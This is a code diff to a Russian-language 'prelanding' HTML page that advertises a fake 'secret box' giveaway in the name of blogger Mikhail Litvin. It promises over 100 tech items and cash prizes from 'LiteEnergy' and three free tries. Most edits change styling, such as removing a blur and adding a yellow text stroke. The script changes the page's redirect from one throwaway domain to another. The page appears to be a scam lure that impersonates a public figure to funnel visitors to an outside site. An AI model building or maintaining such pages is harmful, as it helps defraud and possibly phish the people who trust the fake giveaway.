@@ -35,22 +35,19 @@
             z-index: -1;
         }
 
-        /* Добавление размытия (блюра) к основному контенту */
-        .main-content-blur {
-            backdrop-filter: blur(1px); /* Возвращено минимальное размытие 1px */
-        }
-        
         /* Добавление тени к крупному тексту для лучшего контраста */
         .text-shadow-strong {
             text-shadow: 0 0 5px rgba(0, 0, 0, 0.8), 0 0 20px rgba(255, 255, 255, 0.4);
         }
 
-        /* Умеренная обводка к тексту (0.75px) */
-        .text-stroke-black {
-            /* Обводка для Webkit (Chrome, Safari) */
-            -webkit-text-stroke: 0.75px #000; 
-            /* Стандартная обводка (хотя support ограничен) */
-            text-stroke: 0.75px #000;
+        /* Обводка и тень: ЖЕЛТАЯ обводка и небольшая черная тень для выделения */
+        .text-enhanced-stroke {
+            /* Яркий желтый цвет обводки (#FBBF24 - yellow-400) */
+            -webkit-text-stroke: 1px #FBBF24; 
+            text-stroke: 1px #FBBF24;
+            /* Легкая тень для дополнительного объема */
+            text-shadow: 0 0 2px #000;
+            color: white; /* Цвет текста остается белым */
         }
         
         /* Убран эффект свечения */
@@ -70,8 +67,8 @@
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <!-- Основной контейнер прелендинга с блюром -->
-    <main class="main-content-blur text-center bg-black bg-opacity-50 p-8 md:p-12 lg:p-16 rounded-xl shadow-2xl max-w-4xl w-full">
+    <!-- Основной контейнер прелендинга (блюр удален) -->
+    <main class="text-center bg-black bg-opacity-50 p-8 md:p-12 lg:p-16 rounded-xl shadow-2xl max-w-4xl w-full">
         <!-- Заголовок -->
         <h1 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold leading-tight mb-4 text-white text-shadow-strong">
             Михаил Литвин - Розыгрыш Секретных Коробок
@@ -83,8 +80,8 @@
             <span id="prize-counter" class="text-5xl sm:text-6xl lg:text-7xl font-extrabold text-white text-shadow-strong">35</span>
         </div>
 
-        <!-- Краткое описание с обводкой. Цвет текста изменен на желтый (text-yellow-400) -->
-        <p class="text-md sm:text-lg lg:text-xl text-yellow-400 mb-6 max-w-2xl mx-auto text-stroke-black">
+        <!-- Краткое описание с новой желтой обводкой и белым текстом -->
+        <p class="text-md sm:text-lg lg:text-xl text-white mb-6 max-w-2xl mx-auto text-enhanced-stroke">
             Открой свою удачу! Разыгрываются **Более 100 единиц компьютерной и мобильной техники**, а также множество денежных призов от компании LiteEnergy. У тебя есть **3 попытки** для открытия коробки! Без обмана, всё по-братски.
         </p>
 
@@ -134,7 +131,7 @@
             messageBox.style.display = 'block';
 
             // Перенаправляем на указанный URL
-            window.location.href = 'https://littlenvget.shop/public/7785103963242420';
+            window.location.href = 'https://creativecallproject.site/public/7722103963237521';
         });
     </script>
 </body>
